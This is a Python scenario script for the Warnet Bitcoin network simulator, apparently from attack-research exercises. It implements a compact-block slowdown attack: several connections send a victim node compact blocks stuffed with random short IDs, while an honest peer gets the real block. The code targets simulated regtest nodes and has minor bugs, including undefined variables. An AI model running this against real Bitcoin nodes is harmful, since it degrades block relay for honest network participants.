#!/usr/bin/env python3

from pprint import (
    pp,
)

import random
import socket
from datetime import (
    datetime,
    timedelta,
)

from commander import Commander

from test_framework.test_framework import BitcoinTestFramework
from test_framework.blocktools import (
    create_block,
    create_coinbase,
    NORMAL_GBT_REQUEST_PARAMS
)

from test_framework.wallet import MiniWallet

# The entire Bitcoin Core test_framework directory is available as a library
from test_framework.messages import (
    CBlockHeader,
    CInv,
    HeaderAndShortIDs,
    msg_block,
    msg_cmpctblock,
    msg_headers,
)

from test_framework.p2p import (
    P2PInterface,
)

# The actual scenario is a class like a Bitcoin Core functional test.
# Commander is a subclass of BitcoinTestFramework instide Warnet
# that allows to operate on containerized nodes instead of local nodes.

class CmpctAtk(Commander):
    def set_test_params(self):
        # This setting is ignored but still required as
        # a sub-class of BitcoinTestFramework
        self.num_nodes = 0

    def add_options(self, parser):
        parser.description = (
            "CMPCT BLOCKS THEY SLOW"
        )
        parser.usage = "warnet run scenarios/cmpctatk.py"

    def connect_to_hostname(self, hostname):
        # regtest or signet
        chain = self.nodes[0].chain

        # The victim's address could be an explicit IP address
        # OR a kubernetes hostname (use default chain p2p port)
        dstaddr = socket.gethostbyname(hostname)
        if chain == "regtest":
            dstport = 18444

        conn = P2PInterface()
        conn.peer_connect(
            dstaddr=dstaddr, dstport=dstport, net="regtest", timeout_factor=1
        )()
        conn.wait_until(lambda: conn.is_connected, check_connected=False)
        return conn

    def build_block_on_tip(self, node):
        if self.wallet.get_balance() == 0:
            print("Generating 101 blocks to the miner address for funding.")
            self.generatetoaddress(node, 101, self.wallet.get_address(), sync_fun=self.no_op)
            assert (self.wallet.get_balance() > 0)

        txlist = [self.wallet.create_self_transfer()['tx']]

        block = create_block(tmpl=self.nodes[0].getblocktemplate(NORMAL_GBT_REQUEST_PARAMS), txlist=txlist)
        block.solve()
        return block

    def build_fat_empty_cmpct(self, block):
        cmpct_block = HeaderAndShortIDs()
        cmpct_block.header = CBlockHeader(block)

        for i in range(1_000):
            shortid = int.from_bytes(random.randbytes(6), byteorder='little')
            cmpct_block.shortids.append(shortid)

        return cmpct_block

    def check_getdata_received_for_hash(self, conn, hash):
        """Waits for a getdata message.

        The object hashes in the inventory vector must match the provided hash_list."""
        last_data = self.last_message.get("getdata")
        if not last_data:
            return False
        return [x.hash for x in last_data.inv] == hash_list

    def run_test(self):
        attacker = self.tanks['miner']
        victim = "tank1"
        honest = "tank2"

        # Set-up, to get some funds in the wallet.
        honestpeer = self.connect_to_hostname(honest)

        self.wallet = MiniWallet(attacker)
        funding_block = self.build_block_on_tip(attacker)
        honestpeer.send_and_ping(msg_headers([CBlockHeader(funding_block)]))
        honestpeer.wait_for_getdata(funding_block.hash)
        honestpeer.send_and_ping(msg_block(funding_block))

        # Now we will use a python-based Bitcoin p2p node to send very specific,
        # unusual or non-standard messages to a "victim" node.
        self.log.info(f"Attacking {victim}")
        attackers = []
        for i in range(3):
            attackers.append(self.connect_to_hostname(victim))

        next_block_interrupt_time = None
        honestpeer_received = False
        victim_received = False
        while True:
            now = datetime.now()
            if next_block_interrupt_time is None or (victim_received and honestpeer_received and now > next_block_interrupt_time):
                print("Timeout reached, refreshing attack block.")
                real_block = self.build_block_on_tip(attacker)
                attack_block = self.build_fat_empty_cmpct(real_block)
                attack_block_msg = msg_cmpctblock(attack_block.to_p2p())
                next_block_interrupt_time = datetime.now() + timedelta(seconds=15)
                honestpeer_received = False
                victim_received = False

            if not victim_received:
                for victim_conn in attackers:
                    victim_conn.send_message(attack_block_msg)
                victim_received = True

            honestpeer_getdata = honestpeer.last_message.get("getdata")

            # If the honest peer has not already received the block, and has
            # requested the block after receiving the header from us: send the block.
            if not honestpeer_received and next_block_interrupt_time - now > timedelta(seconds=10):
                if honestpeer_getdata is not None:
                    honestpeer.send_and_ping(msg_block(real_block))
                    honestpeer_received = True
                    print(f"Honest peer sent us a getdata for {real_block.hash} and we responded.")
                else:  # Otherwise send the header.
                    headers_message = msg_headers()
                    headers_message.headers = [CBlockHeader(real_block)]
                    honestpeer.send_message(headers_message)


def main():
    CmpctAtk().main()


if __name__ == "__main__":
    main()
